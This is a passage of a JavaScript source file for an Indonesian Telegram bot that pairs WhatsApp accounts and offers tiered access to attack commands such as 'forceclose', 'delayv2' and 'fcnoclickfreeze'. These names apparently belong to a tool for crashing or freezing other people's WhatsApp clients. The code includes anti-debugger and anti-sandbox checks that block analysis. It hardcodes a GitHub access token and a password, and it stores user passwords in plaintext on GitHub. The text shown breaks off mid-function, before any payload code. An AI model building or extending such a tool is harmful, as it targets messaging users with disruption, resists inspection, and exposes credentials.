const {
    default: makeWASocket,
    useMultiFileAuthState,
    encodeSignedDeviceIdentity,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    fetchLatestBaileysVersion, 
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    baileys, 
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const Module = require("module");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
//Hapus Axios asli lu ganti punya gw dibawah ini
const axios = require('axios');
const acorn = require('acorn');
const FormData = require('form-data');
const moment = require('moment-timezone');
const vm = require('vm');
const { fileTypeFromBuffer } = require('file-type');
const github = {
  token: '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',
  repoOwner: 'khususbanding749-ai',
  repoName: 'GrenTzy1',
  akunPath: 'akun.json',
  tokenPath: 'token.json'
};

try {
  if (
    typeof axios.get !== 'function' ||
    typeof axios.create !== 'function' ||
    typeof axios.interceptors !== 'object' ||
    !axios.defaults
  ) {
    console.error(`[SECURITY] Axios telah dimodifikasi`);
    process.abort();
  }

  if (
    axios.interceptors.request.handlers.length > 0 ||
    axios.interceptors.response.handlers.length > 0
  ) {
    console.error(`[SECURITY] Axios interceptor aktif (bypass terdeteksi)`);
    process.abort();
  }

  const env = process.env;
  if (
    env.HTTP_PROXY || env.HTTPS_PROXY || env.NODE_TLS_REJECT_UNAUTHORIZED === '0'
  ) {
    console.error(`[SECURITY] Proxy atau TLS bypass aktif`);
    process.abort();
  }

  const execArgs = process.execArgv.join(' ');
  if (/--inspect|--debug|repl|vm2|sandbox/i.test(execArgs)) {
    console.error(`[SECURITY] Debugger / sandbox / VM terdeteksi`);
    process.abort();
  }

  const realToString = Function.prototype.toString.toString();
  if (Function.prototype.toString.toString() !== realToString) {
    console.error(`[SECURITY] Function.toString dibajak`);
    process.abort();
  }

  const mod = require('module');
  const _load = mod._load.toString();
  if (!_load.includes('tryModuleLoad') && !_load.includes('Module._load')) {
    console.error(`[SECURITY] Module._load telah dibajak`);
    process.abort();
  }

  const cache = Object.keys(require.cache || {});
  const suspicious = cache.filter(k =>
    k.includes('axios') &&
    !/node_modules[\\/]+axios[\\/]+(dist[\\/]+node[\\/]+axios\.cjs|index\.js)$/.test(k)
  );

  if (suspicious.length > 0) {
    console.error(`[SECURITY] require.cache mencurigakan`);
    process.abort();
  }

} catch (err) {
  console.error(`[SECURITY] Proteksi gagal jalan:`, err);
  process.abort();
}
console.log("✅ Proteksi Anti Bypass Active ./Xata");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./premium.json');
ensureFileExists('./admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}

// ======================== LOAD PREMIUM & ADMIN USERS ========================

function saveOwners(owners) {
    try {
        console.log('Mencoba menyimpan owners ke:', OWNERS_FILE);
        console.log('Izin direktori:', fs.statSync(path.dirname(OWNERS_FILE)).mode);
        fs.writeFileSync(OWNERS_FILE, JSON.stringify(owners, null, 2), 'utf8');
        console.log('✅ Owners saved:', owners);
        return true;
    } catch (err) {
        console.error('❌ Gagal save owners:', err.message);
        console.error('Detail error:', err);
        return false;
    }
}


// ==================== KONFIGURASI OWNER ====================
const MAIN_OWNER_ID = 8508651359; // Ganti dengan ID Telegram asli Anda (bukan nomor WA)
const OWNERS_FILE = './database/owners.json'; // Simpan di folder database yang sudah writable

const USERS_FILE = path.join(__dirname, 'database', 'users.json');

// Pastikan folder database ada
if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });

// ==================== FUNGSI LOAD & SAVE OWNER ====================
function loadOwners() {
    try {
        if (fs.existsSync(OWNERS_FILE)) {
            const data = fs.readFileSync(OWNERS_FILE, 'utf8');
            const owners = JSON.parse(data);
            if (!owners.includes(MAIN_OWNER_ID)) {
                owners.push(MAIN_OWNER_ID);
                saveOwners(owners);
            }
            return owners;
        } else {
            const defaultOwners = [MAIN_OWNER_ID];
            saveOwners(defaultOwners);
            return defaultOwners;
        }
    } catch (err) {
        console.error('❌ Gagal load owners:', err.message);
        return [MAIN_OWNER_ID];
    }
}

function saveOwners(owners) {
    try {
        fs.writeFileSync(OWNERS_FILE, JSON.stringify(owners, null, 2), 'utf8');
        console.log('✅ Owners saved to', OWNERS_FILE);
        return true;
    } catch (err) {
        console.error('❌ Gagal save owners:', err.message);
        return false;
    }
}

function isOwner(userId) {
    if (userId === MAIN_OWNER_ID) return true;
    const owners = loadOwners();
    return owners.includes(userId);
}

// Jika Anda juga punya variabel ADMIN_ID atau OWNER_ID dari config, sesuaikan

// Global Map untuk menyimpan sender (key: nomor, value: socket)
const senders = new Map();
let defaultSender = null;

// ==================== FUNGSI TAMBAH SENDER ====================
async function addSender(botNumber, chatId, botTelegram) {
  if (senders.has(botNumber)) {
    await botTelegram.sendMessage(chatId, `⚠️ Sender ${botNumber} sudah terhubung.`);
    return false;
  }

  try {
    // Panggil fungsi connectToWhatsApp yang sudah ada (pastikan tidak process.exit)
    const sock = await connectToWhatsApp(botNumber, chatId, botTelegram);
    if (sock) {
      senders.set(botNumber, sock);
      await botTelegram.sendMessage(chatId, `✅ Sender ${botNumber} berhasil ditambahkan.`);
      return true;
    } else {
      await botTelegram.sendMessage(chatId, `❌ Gagal menambahkan sender ${botNumber}.`);
      return false;
    }
  } catch (error) {
    console.error(`Error adding sender ${botNumber}:`, error);
    await botTelegram.sendMessage(chatId, `❌ Error: ${error.message}`);
    return false;
  }
}

// ==================== COMMAND /addsender ====================


// ==================== FUNGSI GET SENDER AKTIF ====================
function getActiveSender() {
  if (defaultSender && senders.has(defaultSender)) {
    return senders.get(defaultSender);
  }
  // Ambil sender pertama yang tersedia
  const firstKey = senders.keys().next().value;
  return firstKey ? senders.get(firstKey) : null;
}

// ==================== CONTOH COMMAND BUG DENGAN MULTI SENDER ====================


// Hapus fungsi isOwner yang lain (yang menggunakan ADMIN_ID)
// ==================== FUNGSI MANAJEMEN USER ====================
// Simpan user ID jika belum ada
function saveUser(userId) {
    try {
        let users = [];
        if (fs.existsSync(USERS_FILE)) {
            users = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
        }
        if (!users.includes(userId)) {
            users.push(userId);
            fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
            console.log(`User baru ditambahkan: ${userId}`);
        }
    } catch (err) {
        console.error('Gagal simpan user:', err.message);
    }
}

// Ambil semua user yang pernah berinteraksi
function getAllUsers() {
    try {
        if (!fs.existsSync(USERS_FILE)) return [];
        return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
    } catch (err) {
        console.error('Gagal baca users:', err.message);
        return [];
    }
}

// ==================== NOTIFIKASI KE SEMUA USER ====================
async function notifyAllUsersRestart() {
    const usersFilePath = path.join(__dirname, 'database', 'users.json');
    let users = [];

    try {
        if (fs.existsSync(usersFilePath)) {
            const data = fs.readFileSync(usersFilePath, 'utf8');
            const parsed = JSON.parse(data);
            if (Array.isArray(parsed)) users = parsed;
            else return;
        } else return;
    } catch (err) {
        return;
    }

    if (users.length === 0) return;

    console.log(`Mengirim notifikasi restart ke ${users.length} user...`);
    let success = 0;
    let invalidUsers = [];

    for (const userId of users) {
        try {
            await bot.sendMessage(userId, "✅ Bot telah selesai direstart dan sekarang ready kembali!");
            success++;
            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (err) {
            // Error tidak ditampilkan di panel
            invalidUsers.push(userId);
        }
    }

    if (invalidUsers.length > 0) {
        const validUsers = users.filter(id => !invalidUsers.includes(id));
        fs.writeFileSync(usersFilePath, JSON.stringify(validUsers, null, 2));
        console.log(`🧹 Dihapus ${invalidUsers.length} user tidak valid dari database.`);
    }

    console.log(`Notifikasi restart: ${success} berhasil, ${invalidUsers.length} user dihapus.`);
}
// ==================== FUNGSI RESTART (Alternatif) ====================
// Jika Anda ingin fungsi restart yang bisa dipanggil dari kode lain:


// File untuk menyimpan chatId yang perlu diberi notifikasi setelah restart
const RESTART_NOTIFY_FILE = path.join(__dirname, 'database', 'restart_notify.json');

// Pastikan folder database ada
if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });

// Fungsi untuk menyimpan chatId sebelum restart
function saveRestartNotify(chatId) {
    fs.writeFileSync(RESTART_NOTIFY_FILE, JSON.stringify({ chatId: chatId, timestamp: Date.now() }), 'utf8');
}

// Fungsi untuk menghapus file notifikasi setelah digunakan
function clearRestartNotify() {
    if (fs.existsSync(RESTART_NOTIFY_FILE)) {
        fs.unlinkSync(RESTART_NOTIFY_FILE);
    }
}

// Fungsi untuk mengirim notifikasi restart sukses (dipanggil saat bot mulai)
async function notifyRestartSuccess(bot) {
    try {
        if (fs.existsSync(RESTART_NOTIFY_FILE)) {
            const data = JSON.parse(fs.readFileSync(RESTART_NOTIFY_FILE, 'utf8'));
            const chatId = data.chatId;
            try {
                await bot.sendMessage(chatId, "✅ Bot berhasil direstart dan sekarang online kembali.");
                clearRestartNotify();
                console.log(`✅ Notifikasi restart sukses dikirim ke ${chatId}`);
            } catch (sendErr) {
                // Tangani error "chat not found" (user belum pernah chat dengan bot)
                if (sendErr.response && sendErr.response.statusCode === 400 && 
                    sendErr.response.description && sendErr.response.description.includes("chat not found")) {
                    console.log(`⚠️ User ${chatId} belum pernah chat dengan bot, notifikasi diabaikan.`);
                } else {
                    console.error(`❌ Gagal mengirim notifikasi ke ${chatId}:`, sendErr.message);
                }
                // Tetap hapus file agar tidak diulang terus saat restart berikutnya
                clearRestartNotify();
            }
        }
    } catch (err) {
        console.error("❌ Gagal membaca file notifikasi restart:", err.message);
    }
}


// ==== PASSWORD FILE ====

const pwFile = path.join(__dirname, 'password.json');
if (!fs.existsSync(pwFile)) fs.writeFileSync(pwFile, JSON.stringify({ password: null }, null, 2));
function loadPassword() { try { return JSON.parse(fs.readFileSync(pwFile)); } catch (e) { return { password: null }; } }
function savePassword(obj) { fs.writeFileSync(pwFile, JSON.stringify(obj, null, 2)); }


let onlyGroup = false; // default bot bisa di PM & grup

// Map untuk menyimpan koneksi WhatsApp

let passwordDB = { password: null };
function savePassword(db) {
    fs.writeFileSync('./password.json', JSON.stringify(db, null, 2));
}
// ======================== FUNGSI TAMBAHAN YANG HILANG ========================


function getRandomImage() {
    const images = [
        "https://files.catbox.moe/iht2jc.jpg",
        "https://files.catbox.moe/iht2jc.jpg"
    ];
    return images[Math.floor(Math.random() * images.length)];
}

function loadActiveSessions() {
    try {
        if (fs.existsSync(SESSIONS_FILE)) {
            return JSON.parse(fs.readFileSync(SESSIONS_FILE));
        }
    } catch (e) {}
    return [];
}

function getBotRuntime() {
    const uptimeSeconds = process.uptime();
    const days = Math.floor(uptimeSeconds / 86400);
    const hours = Math.floor((uptimeSeconds % 86400) / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);
    return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}

function getCurrentDate() {
    const now = new Date();
    return now.toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
}

function formatRuntime(seconds) {
    const days = Math.floor(seconds / 86400);
    const hours = Math.floor((seconds % 86400) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${days}d ${hours}h ${minutes}m ${secs}s`;
}

// ======================== FILE STORAGE HELPERS ========================
function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

function loadChats() {
    if (!fs.existsSync(CHATS_FILE)) return [];
    try { return JSON.parse(fs.readFileSync(CHATS_FILE, 'utf8')); } catch { return []; }
}
function saveChats(chats) { fs.writeFileSync(CHATS_FILE, JSON.stringify(chats, null, 2)); }
function addChat(chatId) {
    let chats = loadChats();
    if (!chats.includes(chatId)) { chats.push(chatId); saveChats(chats); return true; }
    return false;
}
function removeChat(chatId) {
    let chats = loadChats();
    const newChats = chats.filter(id => id !== chatId);
    if (newChats.length !== chats.length) { saveChats(newChats); return true; }
    return false;
}

function loadOwners() {
    if (!fs.existsSync(OWNERS_FILE)) return [];
    try { return JSON.parse(fs.readFileSync(OWNERS_FILE, 'utf8')); } catch { return []; }
}
function saveOwners(owners) { fs.writeFileSync(OWNERS_FILE, JSON.stringify(owners, null, 2)); }
function addOwner(userId) {
    let owners = loadOwners();
    if (!owners.includes(userId)) { owners.push(userId); saveOwners(owners); return true; }
    return false;
}
function removeOwner(userId) {
    let owners = loadOwners();
    const newOwners = owners.filter(id => id !== userId);
    if (newOwners.length !== owners.length) { saveOwners(newOwners); return true; }
    return false;
}

let BOT_ACTIVE = true; // Atur sesuai keinginan
let GLOBAL_PASSWORD = "GrenTzy"; // Ganti dengan password yang Anda inginkan

// Data verifikasi (disimpan dalam file JSON)
let verifiedData = {
  tokenVerified: [],
  fullyVerified: []
};
const VERIFIED_FILE = "./verified.json";

// Fungsi untuk memuat data verifikasi dari file
function loadVerifiedData() {
  try {
    if (fs.existsSync(VERIFIED_FILE)) {
      const data = fs.readFileSync(VERIFIED_FILE, "utf8");
      verifiedData = JSON.parse(data);
    } else {
      saveVerifiedData();
    }
  } catch (err) {
    console.error("Gagal load verified data:", err);
  }
}

function blockIfPM(msg) {
    if (onlyGroup && msg.chat.type === "private") {
        bot.sendMessage(msg.chat.id, "❌ Bot hanya bisa digunakan di grup saat ini. Mode *Only Group* sedang aktif.", { parse_mode: "Markdown" });
        return true;
    }
    return false;
}

// Fungsi untuk menyimpan data verifikasi
function saveVerifiedData() {
  fs.writeFileSync(VERIFIED_FILE, JSON.stringify(verifiedData, null, 2));
}

// URL untuk mengambil daftar token valid dari GitHub
// Load status mode dari file
const GROUP_MODE_FILE = "./groupmode.json";

// Load & save mode
function loadGroupMode() {
    try {
        if (fs.existsSync(GROUP_MODE_FILE)) {
            const data = JSON.parse(fs.readFileSync(GROUP_MODE_FILE, 'utf8'));
            onlyGroup = data.onlyGroup === true;
        } else {
            saveGroupMode();
        }
    } catch (err) {
        console.error("Gagal load group mode:", err.message);
        onlyGroup = false;
        saveGroupMode();
    }
}
function saveGroupMode() {
    try {
        fs.writeFileSync(GROUP_MODE_FILE, JSON.stringify({ onlyGroup }, null, 2));
    } catch (err) {
        console.error("Gagal save group mode:", err.message);
    }
}
loadGroupMode();

// Load status mode dari file

// Fungsi untuk mengecek apakah user adalah admin atau premium
function isAdminOrPremium(userId) {
    const isAdmin = (typeof adminUsers !== 'undefined' && adminUsers.includes(String(userId)));
    const isPremium = (typeof premiumUsers !== 'undefined' && premiumUsers.some(p => String(p.id) === String(userId)));
    return isAdmin || isPremium;
}

// Fungsi untuk mengecek apakah pesan harus diblokir di PM
function checkGroupOnly(msg) {
    if (onlyGroup && msg.chat.type === "private") {
        bot.sendMessage(msg.chat.id, "❌ Bot hanya bisa digunakan di grup saat ini.");
        return false;
    }
    return true;
}

// Panggil loadVerifiedData saat bot mulai
loadVerifiedData();

// ==================== OTORITASI ====================
// ==================== KONFIGURASI (ISI SESUAI ANDA) ====================

// PASTIKAN KODE INI DILETAKKAN **SETELAH** INISIALISASI BOT, CONTOH:
// const bot = new Telegraf(BOT_TOKEN);   atau
// const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const antrianStatus = new Map(); // default tidak ada = nonaktif

function isAntrianEnabled(chatId) {
    return antrianStatus.get(chatId) === true;
}

function setAntrianEnabled(chatId, enabled) {
    if (enabled) {
        antrianStatus.set(chatId, true);
    } else {
        antrianStatus.delete(chatId);
    }
}

// ==================== KONFIGURASI GITHUB ====================

// Modifikasi fungsi enqueueTestFunc agar hanya aktif jika antrian di chat tersebut diaktifkan
function enqueueTestFunc(chatId, executionFunction) {
    // Jika antrian tidak aktif, langsung jalankan fungsi tanpa antrian
    if (!isAntrianEnabled(chatId)) {
        return executionFunction();
    }

    // Jika aktif, masukkan ke antrian
    return new Promise((resolve, reject) => {
        if (!testfuncQueues.has(chatId)) {
            testfuncQueues.set(chatId, []);
        }
        const queue = testfuncQueues.get(chatId);
        queue.push({ resolve, reject, run: executionFunction });
        if (queue.length === 1) {
            processNextTestFunc(chatId);
        } else {
            bot.sendMessage(chatId, `⏳ *Command dalam antrian!* Posisi: ${queue.length}. Harap tunggu giliran...`, { parse_mode: 'Markdown' })
                .catch(() => {});
        }
    });
}

async function processNextTestFunc(chatId) {
    const queue = testfuncQueues.get(chatId);
    if (!queue || queue.length === 0) return;
    const current = queue[0];
    try {
        const result = await current.run();
        current.resolve(result);
    } catch (err) {
        current.reject(err);
    } finally {
        queue.shift();
        if (queue.length > 0) {
            processNextTestFunc(chatId);
        }
    }
}

// ==================== KONFIGURASI GITHUB (SESUAIKAN DENGAN REPO ANDA) ====================
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/khususbanding749-ai/GrenTzy1/refs/heads/main/token.json";
const GITHUB_API_URL = "https://api.github.com/repos/khususbanding749-ai/GrenTzy1/contents/token.json";
const GITHUB_PERSONAL_ACCESS_TOKEN = "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";

// ==================== KONFIGURASI GITHUB ====================


async function restartBot(chatId, reason = "Restart perintah owner") {
    const botInstance = bot; // gunakan instance bot Anda
    await botInstance.sendMessage(chatId, `🔄 Bot akan direstart. Alasan: ${reason}`);
    console.log(`🔄 Restart bot: ${reason}`);
    setTimeout(() => {
        process.exit(0);
    }, 2000);
}


const commandWhitelist = new Map(); // userId -> Set(command) yang diizinkan
const commandDenylist = new Map();  // userId -> Set(command) yang dilarang (deny)

const allCommands = ["delayv2", "delayv1", "forceclose", "blankclickgren", "fcnoclickfreeze", "harimaucombo"];

async function isCommandAllowed(userId, command) {
  if (userId === MAIN_OWNER_ID) return true;
  const allowed = commandWhitelist.get(userId) || new Set();
  return allowed.has(command);
}



// ==================== NOTIFIKASI KE SEMUA OWNER SAAT BOT ONLINE ====================
// Kirim notifikasi ke semua user bahwa bot sudah ready (setiap start)
setTimeout(() => {
    notifyAllUsersRestart();
}, 3000); // delay 3 detik untuk memastikan bot siap

// ==================== SIMPAN TOKEN DI FILE LOKAL ====================
// ==== GITHUB HANDLER ====
const headers = {
  Authorization: `Bearer ${github.token}`,
  Accept: 'application/vnd.github.v3+json'
};

async function getGitHubContent(filePath) {
  try {
    const { data } = await axios.get(
      `https://api.github.com/repos/${github.repoOwner}/${github.repoName}/contents/${filePath}`,
      { headers }
    );
    const content = Buffer.from(data.content, 'base64').toString('utf8');
    return { content: JSON.parse(content), sha: data.sha };
  } catch (err) {
    // 404 => return empty default
    if (err.response?.status === 404) {
      // default shapes: akun -> [], token -> { tokens: [] }
      if (filePath === github.akunPath) return { content: [], sha: null };
      if (filePath === github.tokenPath) return { content: { tokens: [] }, sha: null };
      return { content: [], sha: null };
    }
    console.error("GITHUB ERROR:", err.response?.data || err.message);
    throw new Error("Gagal mengambil data dari GitHub.");
  }
}

async function updateGitHubContent(filePath, newContent, sha) {
  const payload = {
    message: `Update file ${filePath}`,
    content: Buffer.from(JSON.stringify(newContent, null, 2)).toString('base64'),
    sha: sha || undefined
  };
  await axios.put(
    `https://api.github.com/repos/${github.repoOwner}/${github.repoName}/contents/${filePath}`,
    payload,
    { headers }
  );
}

// ==== Akun & Token Helpers (safe) ====
async function addAkun(username, password) {
  const { content, sha } = await getGitHubContent(github.akunPath);
  const arr = Array.isArray(content) ? content : [];
  const exist = arr.find(u => String(u.username) === String(username));
  if (exist) throw new Error("Username sudah terdaftar.");
  arr.push({ username: String(username), password: String(password) });
  await updateGitHubContent(github.akunPath, arr, sha);
}

async function deleteAkun(username) {
  const { content, sha } = await getGitHubContent(github.akunPath);
  const arr = Array.isArray(content) ? content : [];
  const filtered = arr.filter(u => String(u.username) !== String(username));
  if (filtered.length === arr.length) throw new Error("Username tidak ditemukan.");
  await updateGitHubContent(github.akunPath, filtered, sha);
}

async function addToken(token) {
  const { content, sha } = await getGitHubContent(github.tokenPath);
  const obj = (content && typeof content === 'object') ? content : { tokens: [] };
  if (!Array.isArray(obj.tokens)) obj.tokens = [];
  if (obj.tokens.includes(token)) throw new Error("Token sudah ada.");
  obj.tokens.push(token);
  await updateGitHubContent(github.tokenPath, obj, sha);
}

async function deleteToken(token) {
  const { content, sha } = await getGitHubContent(github.tokenPath);
  const obj = (content && typeof content === 'object') ? content : { tokens: [] };
  if (!Array.isArray(obj.tokens)) throw new Error("Format token.json tidak valid.");
  const filtered = obj.tokens.filter(t => t !== token);
  if (filtered.length === obj.tokens.length) throw new Error("Token tidak ditemukan.");
  obj.tokens = filtered;
  await updateGitHubContent(github.tokenPath, obj, sha);
}

// ==================== COMMAND ADD TOKEN ====================
function isVVip(userId) {
  return vvipUsers.includes(userId.toString());
}


// File penyimpanan data VVIP
const VVIP_FILE = "./vvip.json";
let vvipUsers = [];

// Load data VVIP saat startup
function loadVVip() {
  try {
    if (fs.existsSync(VVIP_FILE)) {
      vvipUsers = JSON.parse(fs.readFileSync(VVIP_FILE, "utf8"));
    } else {
      vvipUsers = [];
    }
  } catch (error) {
    console.error("Gagal load VVIP:", error);
    vvipUsers = [];
  }
}

function saveVVip() {
  fs.writeFileSync(VVIP_FILE, JSON.stringify(vvipUsers, null, 2));
}

// Panggil loadVVip() setelah definisi
loadVVip();

// ==================== HANDLER ADD TOKEN ====================


// Load password dari file


// Load admin list (asumsi sudah ada variabel adminUsers atau adminList)
// Pastikan fungsi isAdmin sudah didefinisikan di file Anda
// Jika belum, contoh sederhana:
function isAdmin(userId) {
    // asumsikan ada array adminUsers (dari file admin.json)
    return adminUsers.includes(String(userId));
}

// ==================== HANDLER ====================



// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));

const bot = new TelegramBot(BOT_TOKEN, { polling: true })



async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("sabar kontol lagi gue periksa🤫."));
  console.log(chalk.green(` #- Kontol token lu valid nih👻⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

async function startBot() {
  console.log(
    chalk.red(`
,----,                                         
,/   ,\`|                                         
,|   '  |               ,----,                    
|:..  : |             ,/   ,\`|                    
\`--'  / ;           ,|   '  |                    
,---.   ,/';           |:..  : |                    
,/   ,\` ,/'              \`--'  / ;                   
,|   '  ,/'             ,---.   ,/';                    
|:..  ,/'             ,/   ,\` ,/'                      
\`--',/'              ,|   '  ,/'                        
,---.\`               |:..  ,/'                         
,/   ,\`                \`--',/'                          
,|   '  |                 ---                               
|:..  : |                              
\`--'  / ;              
,---.   ,/';                                                
,/   ,\` ,/'                                                  
,|   '  ,/'
|:..  ,/'
\`--',/'
`)
  );

  console.log(
    chalk.bold.blue(`
══════════════════════════════════
       𝙏𝙃𝙀 GREN X HARIMAU
══════════════════════════════════
`)
  );
}

validateToken();

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`🔎 Ditemukan ${activeNumbers.length} nomor aktif di daftar *Samurai List* 📜`);

      for (const botNumber of activeNumbers) {
        console.log(`⚔️ Menghubungkan Shinobi WhatsApp: ${botNumber}...`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`✅${botNumber} berhasil menyatu dengan medan perang! 🥷`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`🔁 Mengulangi ritual sambungan untuk ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("⛩️ Sambungan ditutup permanen oleh Takdir."));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("💥 Kesalahan saat mengaktifkan koneksi Shinobi:", error);
  }
}


function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`
 ᴘʀᴏsᴇs ᴘᴀɪʀɪɴɢ :  ${botNumber}.....
\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\` ᴘʀᴏsᴇs ᴘᴀɪʀɪɴɢ : ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`ɢᴀɢᴀʟ ᴘᴀɪʀɪɴɢ\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\` ᴘᴀɪʀɪɴɢ sᴜᴄᴄᴇs ɴᴏᴍᴏʀ ${botNumber}\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "THUNDERM");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\` ᴘᴀɪʀɪɴɢ ʙᴏᴛ \`\`\`
ᴄᴏᴅᴇ ᴘᴀɪʀɪɴɢ : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
